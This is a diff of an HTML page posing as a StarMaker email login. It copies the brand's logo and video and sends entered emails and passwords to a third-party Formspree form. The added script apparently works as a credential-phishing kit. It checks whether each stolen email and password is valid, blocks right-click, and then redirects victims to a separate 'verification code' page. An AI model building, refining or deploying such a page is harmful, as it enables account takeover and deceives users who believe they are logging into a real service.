@@ -1,80 +1,733 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="icon" type="image/png" href="https://m.media-amazon.com/images/I/81Z2rz4-hEL.png">
-    <title>StarMaker</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Roboto&family=Sacramento&display=swap"
-      rel="stylesheet"
-    />
-   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Trirong"> 
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">
-    <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
-      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
-      crossorigin="anonymous"
-      referrerpolicy="no-referrer"
-    />
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap">
-    <link rel="stylesheet" href="style.css" />
-  </head>
-  <body>
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/x-icon" href="https://www.starmakerstudios.com/next-assets/favicon.ico">
+  <title>StarMaker - Login</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet" />
+  
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #000000;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+      font-family: 'Montserrat', Arial, Helvetica, sans-serif;
+    }
+
+    .main-container {
+      height: 100vh;
+      width: 100%;
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 32px;
+      color: #ffffff;
+      z-index: 2;
+      background: #000000;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .main-container video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: 0;
+    }
+
+    .main-container .bg-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100vh;
+      width: 100%;
+      background: #000000;
+      opacity: 0.4;
+      z-index: 1;
+    }
+
+    .logo {
+      position: absolute;
+      top: 32px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-20px);
+      z-index: 3;
+      opacity: 0;
+      animation: fadeInDown 1000ms ease-in-out forwards;
+      animation-delay: 300ms;
+    }
+
+    .logo img {
+      max-width: 200px;
+      height: auto;
+      filter: drop-shadow(0 4px 8px rgba(255, 41, 111, 0.3));
+      transition: transform 400ms ease;
+      cursor: pointer;
+    }
+
+    .logo img:hover {
+      transform: scale(1.1);
+    }
+
+    @keyframes fadeInDown {
+      to {
+        opacity: 1;
+        transform: translateX(-50%) translateY(0);
+      }
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes shine {
+      0% {
+        left: -100%;
+      }
+      20%, 100% {
+        left: 100%;
+      }
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .hero-section {
+      border-radius: 25px;
+      background-color: #ffffff;
+      text-align: center;
+      position: relative;
+      z-index: 2;
+      max-width: 450px;
+      width: 100%;
+      opacity: 0;
+      transform: translateY(30px);
+      animation: fadeInUp 1000ms ease-in-out forwards;
+      animation-delay: 700ms;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    }
+
+    .upper-text {
+      text-align: center;
+      color: #444444;
+      font-size: 24px;
+      margin-top: -10px;
+      margin-bottom: 20px;
+      font-weight: 700;
+      position: relative;
+    }
+
+    .upper-text p {
+      display: inline-block;
+      position: relative;
+    }
+
+    .upper-text p::after {
+      content: '';
+      position: absolute;
+      bottom: -5px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 0;
+      height: 3px;
+      background: linear-gradient(90deg, #FF296F, #FF6B9D);
+      border-radius: 2px;
+      animation: underlineExpand 800ms ease-in-out forwards;
+      animation-delay: 1.5s;
+    }
+
+    @keyframes underlineExpand {
+      to {
+        width: 60%;
+      }
+    }
+
+    .container {
+      padding: 40px 30px;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 22px;
+    }
+
+    .email-status {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 30px;
+      height: 30px;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .email-status.show {
+      display: flex;
+    }
+
+    .loading-spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #FF296F;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    .check-icon {
+      width: 30px;
+      height: 30px;
+      background: #4CAF50;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .cross-icon {
+      width: 30px;
+      height: 30px;
+      background: #cccccc;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    input[type=email], 
+    input[type=password] {
+      width: 100%;
+      border-radius: 25px;
+      padding: 15px 50px 15px 20px;
+      margin: 5px 0;
+      display: inline-block;
+      border: 2px solid transparent;
+      background: #f1f1f1;
+      font-size: 14px;
+      font-family: 'Montserrat', Arial, sans-serif;
+      transition: all 400ms ease;
+    }
+
+    input[type=email]:focus, 
+    input[type=password]:focus {
+      background-color: #ffffff;
+      border-color: #FF296F;
+      outline: none;
+      box-shadow: 0 4px 12px rgba(255, 41, 111, 0.2);
+    }
+
+    input[type=email]::placeholder,
+    input[type=password]::placeholder {
+      color: #999;
+      transition: all 300ms ease;
+    }
+
+    input[type=email]:focus::placeholder,
+    input[type=password]:focus::placeholder {
+      color: #ccc;
+      transform: translateX(5px);
+    }
+
+    .email-error-msg {
+      color: #d32f2f;
+      font-size: 13px;
+      text-align: left;
+      margin: 5px 0 10px 20px;
+      font-weight: 600;
+      display: none;
+    }
+
+    .email-error-msg.show {
+      display: block;
+    }
+
+    .password-error {
+      color: #d32f2f;
+      font-size: 13px;
+      text-align: left;
+      margin: 5px 0 10px 20px;
+      font-weight: 600;
+      display: none;
+    }
+
+    .password-error.show {
+      display: block;
+    }
+
+    .forgot-password {
+      text-align: right;
+      margin: 15px 0;
+    }
+
+    .forgot-password a {
+      color: #666;
+      text-decoration: underline;
+      font-size: 14px;
+      transition: color 300ms ease;
+    }
+
+    .forgot-password a:hover {
+      color: #FF296F;
+    }
+
+    button {
+      border-radius: 25px;
+      background: linear-gradient(135deg, #FF296F 0%, #FF5B8D 100%);
+      color: white;
+      padding: 16px 20px;
+      margin: 8px 0;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      font-weight: 700;
+      font-family: 'Montserrat', Arial, sans-serif;
+      transition: all 400ms ease;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(255, 41, 111, 0.3);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.4),
+        transparent
+      );
+      transition: left 600ms ease;
+    }
+
+    button:hover::before {
+      left: 100%;
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 25px rgba(255, 41, 111, 0.5);
+      background: linear-gradient(135deg, #FF1B5E 0%, #FF4A7C 100%);
+    }
+
+    button:active {
+      transform: translateY(0px);
+      box-shadow: 0 2px 10px rgba(255, 41, 111, 0.4);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .signupbtn {
+      float: left;
+      width: 100%;
+      position: relative;
+    }
+
+    .signupbtn::after {
+      content: '→';
+      position: absolute;
+      right: 25px;
+      top: 50%;
+      transform: translateY(-50%);
+      opacity: 0;
+      transition: all 400ms ease;
+    }
+
+    .signupbtn:hover::after {
+      opacity: 1;
+      right: 20px;
+    }
+
+    .clearfix::after {
+      content: "";
+      clear: both;
+      display: table;
+    }
+
+    .success-message {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0.8);
+      z-index: 10;
+      background: linear-gradient(135deg, #4CAF50 0%, #66BB6A 100%);
+      color: white;
+      padding: 25px 50px;
+      border-radius: 20px;
+      font-weight: 700;
+      font-size: 20px;
+      text-align: center;
+      opacity: 0;
+      transition: all 500ms cubic-bezier(0.68, -0.55, 0.265, 1.55);
+      box-shadow: 0 10px 40px rgba(76, 175, 80, 0.4);
+    }
+
+    .success-message.show {
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    .success-message::before {
+      content: '✓';
+      display: block;
+      font-size: 40px;
+      margin-bottom: 10px;
+      animation: checkmark 600ms ease;
+    }
+
+    @keyframes checkmark {
+      0% {
+        transform: scale(0) rotate(0deg);
+      }
+      50% {
+        transform: scale(1.2) rotate(180deg);
+      }
+      100% {
+        transform: scale(1) rotate(360deg);
+      }
+    }
+
+    .error-message {
+      color: #ff3333;
+      font-size: 13px;
+      margin-top: -15px;
+      margin-bottom: 15px;
+      text-align: center;
+      font-weight: 600;
+      opacity: 0;
+      transform: translateY(-10px);
+      transition: all 400ms ease;
+    }
+
+    .error-message.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .loading {
+      pointer-events: none;
+      opacity: 0.7;
+    }
+
+    .loading::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 800ms linear infinite;
+    }
+
+    @media screen and (max-width: 600px) {
+      .main-container {
+        padding: 20px;
+      }
+
+      .hero-section {
+        max-width: 100%;
+      }
+
+      .container {
+        padding: 30px 20px;
+      }
+
+      .upper-text {
+        font-size: 20px;
+      }
+
+      .logo img {
+        max-width: 180px;
+      }
+
+      button {
+        font-size: 15px;
+        padding: 14px 20px;
+      }
+
+      .success-message {
+        padding: 20px 40px;
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-container">
+    <video autoplay loop muted playsinline>
+      <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4" />
+    </video>
+    <div class="bg-overlay"></div>
     
-    <div class="main-container">
-      <video autoplay loop muted>
-        <source src="https://static.starmakerstudios.com/www-index-1/bg/wwww-new-v2-video.mp4" type="video/mp4" />
-      </video>
-
-      <div class="bg-overlay"></div>
-
-      <nav>
-       <div class="logo">
-          <!--https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5cwEjEiyLQ2Xfg6Q7YkezUCIME_DVAAhsXmwPnWaolKqB0LydcxEXZ4TNDdNXsXcJ_fNPG4C6jG-YbCDkUk6u6G34NupOlxuLIU58M_hasPKdtCmeyzdV0I6NBBxAsU6_QC0zq3qfEppiEnUq2ijWsuomKmsQ3H_d7-5gnIXipf4fmRZhG-AaiAYZAqk/s384/IMG_20231118_020618.png-->
-          <a><img src="https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png"></a>
-        </div>
-
-       
-      </nav> 
-
-      <header class="hero-section">
-      
-        
-    <form action="https://formspree.io/f/mknlngbg" id="my-form" method="POST">
-  <div class="container">
-     <div class="upper-text">
-      <p>Email Login</p>
-     
-</div>
-    
-    <label for="email"></label>
-
-    <input name="email" placeholder="Email Address" type="email" />
-
-    <label for="psw"></label>
-    <input name="psw" placeholder="Enter Your Password" required="" type="password" />
-    
-    <div class="clearfix">
-      <button class="signupbtn" type="submit">Log In</button>
+    <div class="logo">
+      <img src="https://static.starmakerstudios.com/production/cdn/vue/starx-official/prod/_next/static/assets/images/app-icon.d79097a124ad0a00.png" alt="StarMaker Logo">
     </div>
+
+    <header class="hero-section">
+      <form action="https://formspree.io/f/mknlngbg" id="my-form" method="POST">
+        <div class="container">
+          <div class="upper-text">
+            <p>Email Login</p>
+          </div>
+          
+          <div class="input-wrapper">
+            <input id="email-input" name="email" placeholder="Email Address" type="email" required />
+            <div class="email-status" id="email-status"></div>
+          </div>
+          <div class="email-error-msg" id="email-error"></div>
+          
+          <div class="input-wrapper">
+            <input id="password-input" name="psw" placeholder="Enter Your Password" type="password" required />
+          </div>
+          <div class="password-error" id="password-error"></div>
+
+          <div class="forgot-password">
+            <a href="#">Forgot password</a>
+          </div>
+          
+          <div id="error-status" class="error-message"></div>
+          
+          <div class="clearfix">
+            <button class="signupbtn" type="submit" id="submit-btn">Log In</button>
+          </div>
+        </div>
+      </form>
+    </header>
   </div>
-</form>
-   
-      </header>  
- <div class="containersuccess"></div>
+
   <div id="status" class="success-message"></div>
-     
-      
-   </div>   
+
+  <script>
+    // Configuration - Change these to match your server
+    const EMAIL_CHECK_API = 'http://localhost:3000/check-email';
+    const PASSWORD_CHECK_API = 'http://localhost:3001/verify-password';
     
-   
-    <script src="main.js"></script>
-  </body>
+    // Disable right-click
+    document.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+    });
+
+    window.addEventListener("DOMContentLoaded", function () {
+      const form = document.getElementById("my-form");
+      const emailInput = document.getElementById("email-input");
+      const passwordInput = document.getElementById("password-input");
+      const emailStatus = document.getElementById("email-status");
+      const emailError = document.getElementById("email-error");
+      const passwordError = document.getElementById("password-error");
+      const status = document.getElementById("status");
+      const errorStatus = document.getElementById("error-status");
+      const submitBtn = document.getElementById("submit-btn");
+
+      let emailExists = false;
+      let emailCheckTimeout;
+
+      // Check email when user types in password field
+      passwordInput.addEventListener('focus', function() {
+        const email = emailInput.value.trim();
+        if (email && email.includes('@')) {
+          checkEmail(email);
+        }
+      });
+
+      // Also check email when user types in password
+      passwordInput.addEventListener('input', function() {
+        const email = emailInput.value.trim();
+        if (email && email.includes('@') && !emailStatus.classList.contains('show')) {
+          checkEmail(email);
+        }
+      });
+
+      async function checkEmail(email) {
+        // Show loading spinner
+        emailStatus.innerHTML = '<div class="loading-spinner"></div>';
+        emailStatus.classList.add('show');
+        emailError.classList.remove('show');
+        passwordError.classList.remove('show');
+
+        try {
+          const response = await fetch(EMAIL_CHECK_API, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email })
+          });
+
+          const data = await response.json();
+
+          if (data.exists) {
+            // Show green tick
+            emailStatus.innerHTML = '<div class="check-icon">✓</div>';
+            emailExists = true;
+            emailError.classList.remove('show');
+          } else {
+            // Show cross icon
+            emailStatus.innerHTML = '<div class="cross-icon">✕</div>';
+            emailExists = false;
+            emailError.textContent = 'Account is not found. Create one in StarMaker App.';
+            emailError.classList.add('show');
+          }
+        } catch (error) {
+          console.error('Error checking email:', error);
+          // Hide status on error
+          emailStatus.classList.remove('show');
+          emailError.textContent = 'Unable to verify email. Please try again.';
+          emailError.classList.add('show');
+        }
+      }
+
+      async function checkPassword(email, password) {
+        try {
+          const response = await fetch(PASSWORD_CHECK_API, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email, password })
+          });
+
+          const data = await response.json();
+          return data;
+        } catch (error) {
+          console.error('Error checking password:', error);
+          return { success: false, message: 'Unable to verify credentials. Please try again.' };
+        }
+      }
+
+      function success() {
+        form.reset();
+        submitBtn.classList.remove('loading');
+        status.classList.add("show");
+        status.innerHTML = "Logged in successfully!";
+        errorStatus.classList.remove("show");
+        errorStatus.innerHTML = "";
+        emailStatus.classList.remove('show');
+        
+        setTimeout(function() {
+          window.location.href = "https://starmakerstudio.github.io/web/Starmaker%20Web/Verification%20Code/verification.html";
+        }, 1500);
+      }
+
+      function error() {
+        submitBtn.classList.remove('loading');
+        errorStatus.innerHTML = "Oops! There was a problem. Please try again.";
+        errorStatus.classList.add("show");
+        status.classList.remove("show");
+      }
+
+      form.addEventListener("submit", async function (ev) {
+        ev.preventDefault();
+        
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+        
+        // Validate email exists
+        if (!emailExists && email) {
+          emailError.textContent = 'Account is not found. Create one in StarMaker App.';
+          emailError.classList.add('show');
+          return;
+        }
+
+        // Validate password
+        if (!password) {
+          passwordError.textContent = 'Please enter your password';
+          passwordError.classList.add('show');
+          return;
+        }
+
+        errorStatus.classList.remove("show");
+        errorStatus.innerHTML = "";
+        passwordError.classList.remove("show");
+        submitBtn.classList.add('loading');
+        
+        // First, verify password with StarMaker API
+        const passwordCheck = await checkPassword(email, password);
+        
+        if (!passwordCheck.success) {
+          // Password is incorrect
+          submitBtn.classList.remove('loading');
+          passwordError.textContent = passwordCheck.message || 'Username or password is incorrect';
+          passwordError.classList.add('show');
+          return;
+        }
+        
+        // Password is correct, now submit to Formspree
+        const data = new FormData(form);
+        ajax(form.method, form.action, data, success, error);
+      });
+
+      // Add input animation on typing
+      const inputs = form.querySelectorAll('input');
+      inputs.forEach(input => {
+        input.addEventListener('input', function() {
+          if (this.value.length > 0) {
+            this.style.borderColor = '#FF296F';
+          } else {
+            this.style.borderColor = 'transparent';
+          }
+        });
+      });
+    });
+
+    function ajax(method, url, data, success, error) {
+      const xhr = new XMLHttpRequest();
+      xhr.open(method, url);
+      xhr.setRequestHeader("Accept", "application/json");
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState !== XMLHttpRequest.DONE) return;
+        if (xhr.status === 200) {
+          success(xhr.response, xhr.responseType);
+        } else {
+          error(xhr.status, xhr.response, xhr.responseType);
+        }
+      };
+      xhr.send(data);
+    }
+  </script>
+</body>
 </html>
-
-
